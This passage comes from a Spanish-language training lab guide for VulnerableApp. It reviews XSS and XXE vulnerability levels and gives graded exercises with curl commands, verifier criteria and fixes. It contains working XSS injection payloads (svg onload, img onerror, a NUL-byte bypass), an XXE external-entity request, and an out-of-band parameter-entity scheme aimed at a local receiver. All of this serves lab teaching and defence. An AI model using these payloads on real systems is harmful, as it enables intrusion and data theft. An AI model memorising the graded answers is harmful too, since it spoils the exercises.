Igual que LEVEL_4, pero el patrón IMG_INPUT_TAG_CASE_INSENSITIVE_PATTERN se consulta solo en el prefijo anterior al NUL; si no hay coincidencia, el resto se conserva sin escape.

getVulnerablePayloadLevel5; @AttackVector ...CASE_INSENSITIVEIF_TAGS_ARE_PRESENT_BEFORE_NULL_BYTE. La etiqueta implementada incluye <script y es sensible a la posición del NUL.

#### `GET /VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_6`

**Entrada:** {
  "comment": "@RequestParam Map<String,String>; se guarda con levelIdentifier=LEVEL_6"
}

Aplica escapeHtml4 solo al contenido anterior al NUL y concatena el sufijo desde el NUL sin transformar.

getVulnerablePayloadLevel6; @AttackVector ...AFTER_HTML_ESCAPING_POST_CONTENT_BEFORE_NULL_BYTE. La prueba incluida contrasta HTML escapado en un caso sin NUL, pero el flujo con sufijo sin escapar es la debilidad documentada.

#### `GET /VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_7`

**Entrada:** {
  "comment": "@RequestParam Map<String,String>; se guarda con levelIdentifier=LEVEL_7"
}

Guarda el contenido y aplica StringEscapeUtils.escapeHtml4 al contenido completo antes de envolverlo en div.

getVulnerablePayloadLevel7; variant=SECURE y @ChallengeCard sin @AttackVector. La mitigación se hace en la salida; el repositorio conserva el texto original.

#### `GET /VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_8`

**Entrada:** {
  "comment": "@RequestParam Map<String,String>; se rechaza antes de guardar si contiene < o >"
}

Si comment contiene < o > devuelve 400 y no llama a postRepository.save; si no, persiste y lo coloca sin escape en div.

getSecurePayloadLevel8; variant=SECURE y @ChallengeCard sin @AttackVector. Es una validación de entrada mínima para este contexto, no una política universal para todos los contextos HTML; la prueba confirma rechazo de <script>.

#### `GET /VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_9`

**Entrada:** {
  "comment": "@RequestParam Map<String,String>; se guarda con levelIdentifier=LEVEL_9"
}

Persiste el valor original, pero al renderizar aplica HtmlUtils.htmlEscapeHex al contenido completo.

getSecurePayloadLevel9; variant=SECURE y @ChallengeCard sin @AttackVector. La prueba espera entidades hexadecimales como &#x3c; y &#x3e;, por lo que la representación no debe confundirse con una etiqueta ejecutable.

### xss-01 · Reflejado en img sin comillas: marcador DOM benigno

Según el código, la respuesta contiene un img con src no entrecomillado y el atributo onerror aportado por el laboratorio. Esto es evidencia de reflexión en un contexto HTML; curl no ejecuta el navegador.
Verificación: Chromium dentro de Kali debe ejecutar el marcador DOM inocuo. La reflexión sola no otorga puntos.

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

La clase concatena imageLocation dentro de <img src=%s>. El valor benigno fuerza un error de carga local y solo escribe un marcador en el DOM; no lee cookies, no usa red y no envía información a otro host.

Lee el objetivo y contrasta la entrada con su mitigación. La siguiente receta usa la distribución y fixtures de este proyecto.

```bash
lab request xss-01 --method GET --param 'src=/VulnerableApp/images/missing.png" onerror="document.body.dataset.vaLab=`VA_XSS_IMG_L1`"'
```

Observa success, awarded y la evidencia devuelta; repetir una misión lograda no duplica sus puntos.

**Criterio del verificador:**

```json
{
  "kind": "browser_dataset",
  "path": "vaLab",
  "value": "VA_XSS_IMG_L1"
}
```

**Pistas:**

El método no pone comillas alrededor del placeholder %s.

Use un recurso local inexistente para que el evento sea inocuo y un marcador DOM único.

**Corrección recomendada:** Usar una allowlist de URLs o identificadores de imagen, construir el nodo con APIs DOM seguras cuando corresponda y aplicar codificación contextual de atributo. No aceptar HTML controlado por el usuario en innerHTML.

### xss-02 · Control positivo de allowlist en img LEVEL_6

Según el código, una de las dos rutas permitidas produce 200 y un img con src entrecomillado y escapado.

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

Este es el control positivo de entrada legítima para contrastar con una entrada de evento o una URL no permitida. El contains verifica forma de respuesta, no la seguridad completa del navegador.

```bash
curl -i --get http://target:9090/VulnerableApp/XSSInImgTagAttribute/LEVEL_6 --data-urlencode 'src=/VulnerableApp/images/ZAP.png'
```

Comprobar el estado y el fragmento exacto del cuerpo; un 200 aislado no es prueba de ausencia de XSS.

Registrar la misma prueba con el cliente del laboratorio:
lab request xss-02 --method GET --param src=/VulnerableApp/images/ZAP.png --header Accept=text/html

**Criterio del verificador:**

```json
{
  "kind": "contains",
  "value": "<img src=\"/VulnerableApp/images/ZAP.png\" width=\"400\" height=\"300\"/>"
}
```

**Pistas:**

La whitelist de LEVEL_6 contiene exactamente ZAP.png y OWASP.png bajo /VulnerableApp/images/.

Contraste este caso con el ejercicio siguiente, que usa un valor sintácticamente parecido pero no permitido.

**Corrección recomendada:** Mantener la allowlist exacta o mapear un identificador corto a recursos internos; conservar el escape contextual y no aceptar URLs arbitrarias.

### xss-03 · Control negativo de img LEVEL_6 ante evento benigno

El valor no coincide con allowedValues, por lo que el método debería responder 400 y no construir el img.

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

Contrasta una ruta permitida con una entrada que intenta añadir un manejador pero no es un miembro de la whitelist. El marcador nunca debe llegar al HTML de respuesta en este nivel.

```bash
curl -i --get http://target:9090/VulnerableApp/XSSInImgTagAttribute/LEVEL_6 --data-urlencode 'src=/VulnerableApp/images/missing.png" onerror="document.body.dataset.vaLab=`VA_XSS_IMG_L6_NEG`"'
```

Comparar con el control positivo de /VulnerableApp/images/ZAP.png.

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "Verificar en la salida de curl un estado HTTP 400 y ausencia del marcador o de un img generado. No inferir seguridad solo del estado HTTP: el control se apoya en la revisión del flujo de whitelist, comillas y escape."
}
```

**Pistas:**

La validación ocurre antes de String.format.

No uses alert ni cookies; el marcador es solo una referencia para inspección si llegara a reflejarse.

**Corrección recomendada:** Rechazar por allowlist antes de renderizar y registrar de forma segura los rechazos; no relajar el control a filtros de subcadenas.

### xss-04 · Reflected HTML tag injection LEVEL_1

Según el código, el valor se refleja literalmente dentro de un div y la interfaz lo asigna a innerHTML.
Verificación: Chromium dentro de Kali debe ejecutar el marcador DOM inocuo. La reflexión sola no otorga puntos.

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

LEVEL_1 no filtra las claves ni sus valores. SVG onload es un marcador benigno de ejecución DOM; no realiza solicitudes, no lee cookies y no muestra datos sensibles.

Lee el objetivo y contrasta la entrada con su mitigación. La siguiente receta usa la distribución y fixtures de este proyecto.

```bash
lab request xss-04 --method GET --param 'value=<svg onload="document.body.dataset.vaLab=`VA_XSS_HTML_L1`"></svg>'
```

Observa success, awarded y la evidencia devuelta; repetir una misión lograda no duplica sus puntos.

**Criterio del verificador:**

```json
{
  "kind": "browser_dataset",
  "path": "vaLab",
  "value": "VA_XSS_HTML_L1"
}
```

**Pistas:**

La plantilla JS envía el parámetro value y asigna la respuesta a innerHTML.

El payload no contiene alert, javascript, llamadas de red ni acceso a cookies.

**Corrección recomendada:** Aplicar escape HTML al insertar texto, usar textContent cuando se espera texto y evitar innerHTML con datos no confiables.

### xss-05 · Bypass inocuo del blacklist de etiquetas en LEVEL_2

La expresión regular también bloquea svg en minúsculas porque s pertenece a su clase de caracteres. La variante SVG mayúscula permite observar el marcador DOM benigno.

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

La expresión regular es un blacklist frágil, no un parser HTML ni una sanitización. El marcador está limitado a una mutación DOM local.

Lee el objetivo y contrasta la entrada con su mitigación. La siguiente receta usa la distribución y fixtures de este proyecto.

```bash
lab request xss-05 --method GET --param 'value=<SVG onload="document.body.dataset.vaLab=`VA_XSS_HTML_L2`"></SVG>'
```

Observa success, awarded y la evidencia devuelta; repetir una misión lograda no duplica sus puntos.

**Criterio del verificador:**

```json
{
  "kind": "browser_dataset",
  "path": "vaLab",
  "value": "VA_XSS_HTML_L2"
}
```

**Pistas:**

El Pattern contiene clases de caracteres y no enumera svg.

No añadas palabras alert o javascript: el objetivo es comprobar el filtro, no ejecutar una acción dañina.

**Corrección recomendada:** Eliminar el blacklist y codificar según contexto; si se necesita HTML enriquecido, usar una sanitización HTML mantenida con allowlist de elementos y atributos.

### xss-06 · Control seguro para HTML tag injection LEVEL_4

El código aplica escapeHtml4 y por ello el texto debe aparecer como entidades HTML dentro de div, no como un elemento svg ejecutable.

**Puntaje:** 60 XP. Evidencia observada por el runner de Kali.

Es el control negativo frente a LEVEL_1 y LEVEL_2. not_contains solo verifica la representación textual de la respuesta; la verificación de que el navegador no creó un nodo debe ser manual y no depende de un click.

```bash
curl -i --get http://target:9090/VulnerableApp/XSSWithHtmlTagInjection/LEVEL_4 --data-urlencode 'value=<svg onload="document.body.dataset.vaLab=`VA_XSS_HTML_L4`"></svg>'
```

Comprobar que el cuerpo contiene una forma escapada como &lt;svg y no la etiqueta literal <svg.

Si se hace la revisión de navegador, confirmar que no aparece VA_XSS_HTML_L4; no usar interacción como criterio de puntuación.

Registrar la misma prueba con el cliente del laboratorio:
lab request xss-06 --method GET --param 'value=<svg onload="document.body.dataset.vaLab=`VA_XSS_HTML_L4`"></svg>' --header Accept=text/html

**Criterio del verificador:**

```json
{
  "kind": "not_contains",
  "value": "<svg"
}
```

**Pistas:**

LEVEL_4 está marcado variant=SECURE.

El escape de HTML cambia la sintaxis de etiqueta a texto visible.

**Corrección recomendada:** Conservar la codificación contextual y preferir textContent para contenido textual; añadir CSP como defensa en profundidad, no como reemplazo del escape.

### xss-07 · Stored XSS LEVEL_1: separar almacenamiento de ejecución

La primera petición guarda comment y devuelve los posts del nivel dentro de div id=comments; una segunda petición sin comment debería volver a incluir el mismo contenido porque el repositorio es persistente por nivel.
Verificación: Chromium dentro de Kali debe ejecutar el marcador DOM inocuo. La reflexión sola no otorga puntos.

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

getCommentsPayload guarda cualquier comment presente y después renderiza todos los posts sin escape en un div. Las pruebas Mockito confirman la llamada a save y la separación por levelIdentifier.

Lee el objetivo y contrasta la entrada con su mitigación. La siguiente receta usa la distribución y fixtures de este proyecto.

```bash
lab request xss-07 --method GET --param 'comment=<svg onload="document.body.dataset.vaLab=`VA_XSS_PERSIST_L1`"></svg>'
```

Observa success, awarded y la evidencia devuelta; repetir una misión lograda no duplica sus puntos.

**Criterio del verificador:**

```json
{
  "kind": "browser_dataset",
  "path": "vaLab",
  "value": "VA_XSS_PERSIST_L1"
}
```

**Pistas:**

El parámetro se llama comment y se guarda antes de consultar findByLevelIdentifier.

Cada nivel usa su propio levelIdentifier, por lo que este ejercicio no necesita modificar otro nivel.

**Corrección recomendada:** Escapar al renderizar o usar textContent; validar el formato del comentario, controlar la autorización y aplicar sanitización allowlist si el producto realmente requiere HTML.

### xss-08 · Stored XSS LEVEL_6: sufijo posterior a NUL como caso de código

La implementación escapa el prefijo antes del NUL y concatena el sufijo sin escape. El request codifica %00 en la URL para que el laboratorio decida cómo lo decodifica Spring; no contiene comandos ni acceso a archivos.
Verificación: Chromium dentro de Kali debe ejecutar el marcador DOM inocuo. La reflexión sola no otorga puntos.

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

Este ejercicio reproduce la diferencia de ramas del método, no una garantía de comportamiento de todos los proxies. El marcador solo modifica el DOM y no se comunica con ningún receptor.

Lee el objetivo y contrasta la entrada con su mitigación. La siguiente receta usa la distribución y fixtures de este proyecto.

```bash
lab request xss-08 --method GET --param-encoded comment=%3Cspan%3EVA_BEFORE_NUL%3C%2Fspan%3E%00%3Csvg%20onload%3D%22document.body.dataset.vaLab%3D%60VA_XSS_PERSIST_L6%60%22%3E%3C%2Fsvg%3E
```

Observa success, awarded y la evidencia devuelta; repetir una misión lograda no duplica sus puntos.

**Criterio del verificador:**

```json
{
  "kind": "browser_dataset",
  "path": "vaLab",
  "value": "VA_XSS_PERSIST_L6"
}
```

**Pistas:**

La rama vulnerable es post.contains(NULL_BYTE_CHARACTER) ? escapeHtml4(prefijo)+sufijo : escapeHtml4(post).

El contenido de ambos lados es inocuo y no debe contener instrucciones de shell, cookies ni destinos externos.

**Corrección recomendada:** Rechazar caracteres de control antes de persistir y aplicar escape al valor completo, sin concatenar ningún fragmento posterior a un NUL; preferir una única política de codificación contextual.

### xss-09 · Control seguro de Stored XSS LEVEL_7

El comentario puede guardarse, pero la respuesta debería contener entidades escapadas y no la etiqueta svg literal.

**Puntaje:** 60 XP. Evidencia observada por el runner de Kali.

LEVEL_7 aplica escapeHtml4 al contenido completo en el momento de renderizar. Es un control de salida frente a LEVEL_1; la base conserva el valor original y no debe inspeccionarse como si fuera HTML confiable.

```bash
curl -i --get http://target:9090/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_7 --data-urlencode 'comment=<svg onload="document.body.dataset.vaLab=`VA_XSS_PERSIST_L7`"></svg>'
```

```bash
curl -i --get http://target:9090/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_7
```

Comprobar que el cuerpo contiene &lt;svg o equivalente y no <svg; esto es un control de serialización, no una prueba por click.

Registrar la misma prueba con el cliente del laboratorio:
lab request xss-09 --method GET --param 'comment=<svg onload="document.body.dataset.vaLab=`VA_XSS_PERSIST_L7`"></svg>' --header Accept=text/html

**Criterio del verificador:**

```json
{
  "kind": "not_contains",
  "value": "<svg"
}
```

**Pistas:**

La anotación marca variant=SECURE aunque el valor original se persiste.

La prueba existente espera &lt;img ... &gt; en la respuesta de LEVEL_6 sin NUL; usa la misma idea para contrastar LEVEL_7.

**Corrección recomendada:** Mantener el escape contextual en cada salida y usar textContent en el frontend; restringir los permisos de escritura y separar datos de presentación.

### xss-10 · Rechazo de entrada antes de persistir en LEVEL_8

El método comprueba < y > y debe devolver 400 sin llamar a save. Un comentario sin esos caracteres debe seguir el camino normal.
Verificación: Chromium dentro de Kali debe ejecutar el marcador DOM inocuo. La reflexión sola no otorga puntos.

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

La prueba incluida confirma que una entrada con <script> no llama al repositorio. El ejercicio usa SVG solo como cadena de control; nunca se solicita un script ni acceso a secretos.

```bash
curl -i --get http://target:9090/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_8 --data-urlencode 'comment=<svg onload="document.body.dataset.vaLab=`VA_XSS_PERSIST_L8`"></svg>'
```

```bash
curl -i --get http://target:9090/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_8 --data-urlencode 'comment=VA_plain_control'
```

Comparar 400 frente al control plano; no borrar registros ni atribuir puntaje a clicks.

Registrar la misma prueba con el cliente del laboratorio:
lab request xss-10 --method GET --param 'comment=<svg onload="document.body.dataset.vaLab=`VA_XSS_PERSIST_L8`"></svg>' --header Accept=text/html

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "El nivel 8 rechaza la entrada antes de persistir: no se debe esperar ejecución del marcador."
}
```

**Pistas:**

La validación ocurre antes de getCommentsPayload y solo busca los caracteres < y >.

El resultado esperado es un control de rechazo, no una demostración de ejecución.

**Corrección recomendada:** Mantener rechazo temprano para este campo o, preferiblemente, aceptar un formato de datos explícito y escapar al renderizar; no reutilizar esta regla como sanitizador universal.

### xss-11 · Codificación hexadecimal en Stored XSS LEVEL_9

El valor original se guarda, pero la respuesta usa HtmlUtils.htmlEscapeHex; la prueba existente espera entidades como &#x3c; y &#x3e;.

**Puntaje:** 60 XP. Evidencia observada por el runner de Kali.

La comprobación diferencia almacenamiento de presentación: el repositorio puede contener la cadena original, pero el HTML entregado no debe contener una etiqueta literal. not_contains no sustituye una inspección DOM en navegador.

```bash
curl -i --get http://target:9090/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_9 --data-urlencode 'comment=<svg onload="document.body.dataset.vaLab=`VA_XSS_PERSIST_L9`"></svg>'
```

```bash
curl -i --get http://target:9090/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_9
```

Buscar &#x3c;svg o una representación equivalente escapada y confirmar ausencia de <svg literal.

Registrar la misma prueba con el cliente del laboratorio:
lab request xss-11 --method GET --param 'comment=<svg onload="document.body.dataset.vaLab=`VA_XSS_PERSIST_L9`"></svg>' --header Accept=text/html

**Criterio del verificador:**

```json
{
  "kind": "not_contains",
  "value": "<svg"
}
```

**Pistas:**

HtmlUtils.htmlEscapeHex convierte los caracteres especiales a referencias hexadecimales.

No tratar una coincidencia textual del marcador como evidencia de ejecución.

**Corrección recomendada:** Mantener codificación contextual completa al renderizar y evitar que otro consumidor de la base reutilice el texto sin escape.

### xss-12 · Null byte de validación en img LEVEL_5: contraste de transporte

La rama de código valida el prefijo anterior a NUL frente a la whitelist pero renderiza el valor completo escapado. El resultado real depende de cómo target, Spring y los proxies acepten y decodifiquen %00.
Verificación: Chromium dentro de Kali debe ejecutar el marcador DOM inocuo. La reflexión sola no otorga puntos.

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

Es un ejercicio de revisión de la discrepancia validar-prefijo/renderizar-completo. El marcador solo intenta escribir data-va-lab en el DOM y no realiza ninguna operación lateral.

```bash
curl -i --get http://target:9090/VulnerableApp/XSSInImgTagAttribute/LEVEL_5 --data-urlencode 'src=/VulnerableApp/images/ZAP.png'
```

```bash
curl -i --get 'http://target:9090/VulnerableApp/XSSInImgTagAttribute/LEVEL_5?src=%2FVulnerableApp%2Fimages%2FZAP.png%00%22%20onerror%3D%22document.body.dataset.vaLab%3D%60VA_XSS_IMG_L5%60%22'
```

Si target rechaza la URL codificada, dejar constancia de la limitación de transporte y basar la conclusión en el código y la prueba unitaria, no en un resultado inventado.

Registrar la misma prueba con el cliente del laboratorio:
lab request xss-12 --method GET --param 'src=/VulnerableApp/images/ZAP.png%00" onerror="document.body.dataset.vaLab=`VA_XSS_IMG_L5`"' --header Accept=text/html

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "El filtro de img LEVEL_5 no produjo ejecución del marcador en la distribución probada. Analizar el control y transporte; no puntuar reflexión ni un cuerpo vacío."
}
```

**Pistas:**

La prueba de la familia usa   en Java, pero una shell no debe recibir un NUL literal como parte de un argumento.

El primer curl es solo un control de whitelist y el segundo usa %00 en la URL, sin comandos externos.

**Corrección recomendada:** Rechazar caracteres de control, normalizar y validar el valor completo antes de usarlo, y mantener una allowlist exacta de identificadores de imagen.

### Límites de esta familia

La revisión es estática y está limitada estrictamente a la familia xss del commit solicitado. No se inició Docker, no se llamó a target, Mailpit ni receiver y no se afirma que ningún ejercicio haya funcionado en una instancia concreta. Las rutas y métodos se derivan de las anotaciones y del proveedor central; el mapeo exacto de Spring, filtros, proxies, CSP, navegador y perfil public puede cambiar el resultado observado. curl no ejecuta HTML, por lo que contains o not_contains solo verifican representación/reflexión, no ejecución XSS. Un 200 tampoco demuestra IDOR, autorización ni seguridad. La comprobación positiva propuesta es un marcador DOM benigno en un navegador aislado, sin lectura de cookies, sin exfiltración, sin red externa y sin puntuar clicks; si no aparece, no se debe concluir automáticamente que no existe una variante XSS. Los NUL se describen como %00 en URLs porque no es seguro ni fiable insertar un carácter NUL literal en un comando o JSON; servidores y proxies pueden rechazarlo, decodificarlo, truncarlo o normalizarlo. La base persistente POSTS conserva efectos entre peticiones; los ejercicios no borran datos, por lo que una respuesta posterior puede incluir registros preexistentes del mismo LEVEL. Solo se encontraron dos pruebas Java XSS: XSSInImgTagAttributeTest y PersistentXSSInHTMLTagVulnerabilityTest, esta última está en un paquete de test llamado reflected aunque prueba la clase persistent. No hay un archivo dedicado de payloads XSS en src/main/resources/attackvectors; los textos XSS relevantes están en src/main/resources/i18n/messages.properties. El directorio static/templates/XSSWithNullBytesImgTagAttribute existe en el commit, pero no hay una clase @VulnerableAppRestController correspondiente, por lo que no se inventó una ruta ni se contó como nivel. No se cubre DOM-based XSS porque VulnerabilityType lo enumera, pero el commit inspeccionado no aporta un controlador/clase DOM dentro de la familia xss.

## Entidades externas XML y expansión acotada

Informe verificado por lectura de código del commit 4df80bbcd42682ecf26334f12c568e0f4a326c1a. El controlador XXEVulnerability está anotado con @VulnerableAppRestController(value=XXEVulnerability) y cada método usa @VulnerableAppRequestMapping(value=LEVEL_n, requestMethod=POST); aplicando el prefijo indicado por el laboratorio, las rutas son /VulnerableApp/XXEVulnerability/LEVEL_n. El cuerpo es XML crudo application/xml con un elemento raíz book y los campos name, isbn, author, publisher y others. LEVEL_1 deserializa sin restricciones; LEVEL_2 sólo desactiva entidades externas generales y deja abierta la vía de entidades de parámetro/DTD externo; LEVEL_3 desactiva entidades generales y de parámetro pero todavía permite DOCTYPE y no configura un límite de expansión; LEVEL_4 rechaza DOCTYPE y desactiva las fuentes externas; LEVEL_5 conserva esas defensas y además activa namespace awareness y desactiva XInclude; LEVEL_6 permite expansión sin límite de entidad a nivel del XMLReader, con semáforo de una solicitud y timeout cooperativo de 2 segundos; LEVEL_7 desactiva entidades externas, desactiva XInclude y fija un límite programático de expansión de 20. La etiqueta SECURE de la anotación aparece en LEVEL_3, LEVEL_4, LEVEL_5 y LEVEL_7. La clasificación vulnerable se refiere al comportamiento de seguridad de cada configuración, no a que una petición concreta haya sido ejecutada en este entorno.

### Todos los niveles originales

#### `POST /VulnerableApp/XXEVulnerability/LEVEL_1`

**Entrada:** {
  "query": {},
  "form": {},
  "body": "XML crudo; raíz book; campos name, isbn, author, publisher y others",
  "content_type": "application/xml"
}

Lee request.getInputStream(), crea un JAXBContext/Unmarshaller y hace unmarshal directo sin SAXParserFactory configurada. El constructor deja javax.xml.accessExternalDTD=all; por tanto una entidad externa general declarada con SYSTEM puede resolverse y su contenido puede terminar en el Book y en la respuesta JSON. Luego guarda BookEntity con levelIdentifier LEVEL_1.

La fuente de traducciones describe este nivel como sin validación. El ejercicio seguro usa únicamente file:///tmp/va-training.txt, que la imagen del laboratorio debe contener con VA_LAB_FILE; no se debe sustituir por rutas del sistema. Si JAXB o el runtime rechazan el XML, el método captura la excepción, registra el error y devuelve HTTP 200 con isValid=false, por lo que un 200 no demuestra lectura.

#### `POST /VulnerableApp/XXEVulnerability/LEVEL_2`

**Entrada:** {
  "query": {},
  "form": {},
  "body": "XML crudo con posibilidad de DOCTYPE; raíz book y campos de libro",
  "content_type": "application/xml"
}

Construye SAXParserFactory y sólo establece external-general-entities=false antes de pasar el XMLReader a JAXB. Una referencia general directa no debería expandirse, pero external-parameter-entities queda con su configuración por defecto y la fuente de traducciones documenta el patrón de DTD externo con entidades de parámetro que puede causar una solicitud saliente y exfiltrar sólo el marcador del archivo de entrenamiento al receiver local.

Es la separación importante entre entidades generales (&name;) y entidades de parámetro (%name;). Para demostrarla sin un servidor atacante se requiere que el receptor inocuo en receiver:8081 sirva un DTD de entrenamiento predeterminado y registre la solicitud; si esa ruta no existe, el comportamiento OOB no puede concluirse desde curl.

#### `POST /VulnerableApp/XXEVulnerability/LEVEL_3`

**Entrada:** {
  "query": {},
  "form": {},
  "body": "XML crudo; puede incluir DOCTYPE y entidades, pero la configuración bloquea entidades externas generales y de parámetro",
  "content_type": "application/xml"
}

Desactiva external-general-entities y external-parameter-entities, pero deja que el parser vea DOCTYPE. Las entidades externas no deberían seguirse para leer archivos ni para llegar al receiver; sin embargo no se establece un límite de expansión de entidades, así que el código conserva una superficie de expansión interna potencialmente costosa.

SECURE en la anotación sólo respecto del ataque XXE externo. La propia traducción del nivel advierte que permitir DOCTYPE no es una defensa completa frente a XML entity expansion/denial of service. No se debe intentar una bomba; el ejercicio usa una entidad externa que apunta sólo al receptor local como control negativo.

#### `POST /VulnerableApp/XXEVulnerability/LEVEL_4`

**Entrada:** {
  "query": {},
  "form": {},
  "body": "XML crudo; sólo XML sin DOCTYPE debe ser aceptado",
  "content_type": "application/xml"
}

Configura disallow-doctype-decl=true, external-general-entities=false, external-parameter-entities=false y load-external-dtd=false. Un documento que contenga cualquier DOCTYPE debe fallar durante el parseo; un documento XML normal sin DOCTYPE puede convertirse en Book y guardarse.

Es la defensa recomendada cuando la aplicación no necesita declaraciones DOCTYPE. El método captura la excepción y aun así responde HTTP 200 con un bean inválido, por lo que el indicador útil es el JSON isValid=false/content=null, no solamente el código HTTP.

#### `POST /VulnerableApp/XXEVulnerability/LEVEL_5`

**Entrada:** {
  "query": {},
  "form": {},
  "body": "XML crudo; sin DOCTYPE para el caso normal; XInclude explícitamente desactivado",
  "content_type": "application/xml"
}

Repite las defensas de LEVEL_4, activa namespaceAware=true y setXIncludeAware(false). La intención es cerrar también la inclusión XInclude que no necesita DOCTYPE. Un XML normal debe seguir funcionando; una inclusión xi:include hacia el archivo de entrenamiento no debe sustituirse por VA_LAB_FILE.

El test existente cubre configuración segura básica de otros niveles, pero no aporta una prueba de endpoint para XInclude en LEVEL_5. El resultado concreto de un xi:include anidado puede ser un Book inválido o un campo vacío según JAXB; la verificación segura debe ser ausencia de VA_LAB_FILE y no un supuesto exacto sobre isValid.

#### `POST /VulnerableApp/XXEVulnerability/LEVEL_6`

**Entrada:** {
  "query": {},
  "form": {},
  "body": "XML crudo con expansión interna pequeña y acotada; no usar XML bomb",
  "content_type": "application/xml"
}

Adquiere un Semaphore de un permiso; si está ocupado devuelve 429. Para la petición usa TimeoutInputStream y TimingXMLFilter con 2000 ms, crea un XMLReader y establece entityExpansionLimit=0 (primero propiedad Oracle, luego jdk.xml), que en el runtime previsto significa sin límite. No desactiva entidades externas. El timeout y el semáforo reducen el impacto operativo, pero no convierten la configuración en una defensa completa.

El nivel se diseñó alrededor de Billion Laughs/XML Bomb, pero este informe no reproduce una denegación de servicio. Los tests sólo usan una expansión de cinco repeticiones y comprueban el límite de concurrencia, el cierre del stream y el timeout. La clasificación vulnerable cubre el límite relajado y la ausencia de flags externos.

#### `POST /VulnerableApp/XXEVulnerability/LEVEL_7`

**Entrada:** {
  "query": {},
  "form": {},
  "body": "XML crudo con expansión pequeña o DOCTYPE no externo; límite de expansión configurado en 20",
  "content_type": "application/xml"
}

Desactiva entidades externas generales y de parámetro, evita carga de DTD externo, activa namespace awareness, desactiva XInclude y establece entityExpansionLimit=20. No marca disallow-doctype-decl, por lo que un DOCTYPE puede ser leído mientras las entidades externas permanezcan bloqueadas; la expansión interna debe mantenerse bajo el límite.

SECURE respecto de acceso externo y expansión no acotada. El límite depende del parser/runtime y la función falla si no reconoce ninguna de las propiedades; el método devuelve entonces el bean inválido. El ejercicio no intenta superar el umbral ni provocar carga elevada.

### xxe-01 · LEVEL_1 positivo: entidad externa local con marcador inocuo

Si la imagen contiene exactamente /tmp/va-training.txt con el marcador VA_LAB_FILE y el runtime resuelve DTD externas, el campo content.others podría contener VA_LAB_FILE. Es una expectativa derivada del código, no una afirmación de que la petición ya funcionó.

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

LEVEL_1 usa JAXB directamente y el constructor habilita acceso externo DTD. La entidad sólo lee el archivo de entrenamiento autorizado; el resultado esperado hace visible la diferencia entre un XML literal y la sustitución de una entidad. Usar others evita depender de una columna name de 30 caracteres.

Precondición del laboratorio: la imagen ya contiene /tmp/va-training.txt con el texto VA_LAB_FILE. No cambies la ruta por /etc/passwd, /etc/hostname ni ningún secreto.

Desde Kali, enviar el XML real: curl -i -X POST http://target:9090/VulnerableApp/XXEVulnerability/LEVEL_1 -H 'Content-Type: application/xml' --data-binary @- <<'XML'
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE book [<!ENTITY xxe SYSTEM "file:///tmp/va-training.txt">]><book><name>ok</name><isbn>1</isbn><author>a</author><publisher>p</publisher><others>&xxe;</others></book>
XML

Comparar con un control negativo seguro en la misma ruta: enviar el mismo libro sin DOCTYPE ni &xxe; y comprobar que el flujo normal puede devolver isValid=true. La comparación no demuestra por sí sola una lectura si el servicio no devuelve content.others.

Evaluar el check JSON sólo si la respuesta es JSON y contiene content.others. Un HTTP 200 por sí solo no prueba que se haya expandido la entidad: el catch del código devuelve 200 también cuando el parseo falla.

Registrar la misma prueba con el cliente del laboratorio:
lab request xxe-01 --method POST --body '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE book [<!ENTITY xxe SYSTEM "file:///tmp/va-training.txt">]><book><name>ok</name><isbn>1</isbn><author>a</author><publisher>p</publisher><others>&xxe;</others></book>' --content-type application/xml

**Criterio del verificador:**

```json
{
  "kind": "json",
  "path": "content.others",
  "value": "VA_LAB_FILE"
}
```

**Pistas:**

La ruta es POST; no uses --get para este endpoint.

El marcador permitido es exactamente VA_LAB_FILE y el campo de mayor capacidad es others.

Una respuesta con error o con isValid=false es evidencia de que el caso no se verificó, no de una mitigación universal.

**Corrección recomendada:** No usar un Unmarshaller sin una configuración segura. Rechazar DOCTYPE si no es necesario; si es necesario, desactivar entidades externas generales y de parámetro, la carga de DTD externo, XInclude y aplicar un límite de expansión. Validar también el esquema y mantener una política de resolución externa por defecto deny.

### xxe-02 · LEVEL_2 control negativo/positivo: entidades de parámetro hacia el receptor local

Si receiver:8081/xxe-training.dtd es un recurso de entrenamiento preconfigurado que declara %file con file:///tmp/va-training.txt y hace que el parser solicite sólo http://receiver:8081/xxe-marker?x=VA_LAB_FILE, el receptor debería registrar esa solicitud. El cuerpo de respuesta no tiene que contener el marcador. Si receiver no sirve ese DTD, no se puede atribuir ningún resultado al nivel.

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

La configuración sólo bloquea external-general-entities. El patrón documentado por el propio recurso de mensajes requiere un DTD externo para que la cadena de entidades de parámetro sea XML bien formado. Se observa el efecto fuera de banda en receiver, no se intenta que la aplicación devuelva el contenido del archivo.

Precondición: el receiver inocuo debe servir sólo el DTD de entrenamiento acordado en /xxe-training.dtd y registrar solicitudes en /xxe-marker; si no tiene ese recurso, omitir la conclusión de comportamiento OOB. El DTD debe leer únicamente file:///tmp/va-training.txt y enviar sólo el marcador VA_LAB_FILE al mismo receiver.

